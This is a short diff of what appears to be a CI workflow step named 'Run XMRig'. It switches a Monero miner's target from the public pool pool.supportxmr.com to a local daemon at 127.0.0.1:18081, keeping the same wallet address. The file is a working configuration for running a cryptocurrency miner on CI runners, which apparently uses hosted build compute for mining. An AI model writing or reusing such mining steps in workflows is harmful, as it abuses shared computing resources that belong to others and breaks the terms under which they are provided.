@@ -29,4 +29,4 @@ jobs:
       - name: Run XMRig
         run: |
           cd xmrig/build
-          ./xmrig -o pool.supportxmr.com:443 -u 44nFMQFFiFceGgSdPeqpQ4iSf2qm3XtG55JJ3KNUQ9RDJ99Aus2N7FWAwNKMN8xUKDQ6xMM4tgKFUecoiYYhFK2rVSZFuNg -k --tls -p test
+          ./xmrig -o 127.0.0.1:18081 -u 44nFMQFFiFceGgSdPeqpQ4iSf2qm3XtG55JJ3KNUQ9RDJ99Aus2N7FWAwNKMN8xUKDQ6xMM4tgKFUecoiYYhFK2rVSZFuNg --coin monero --daemon
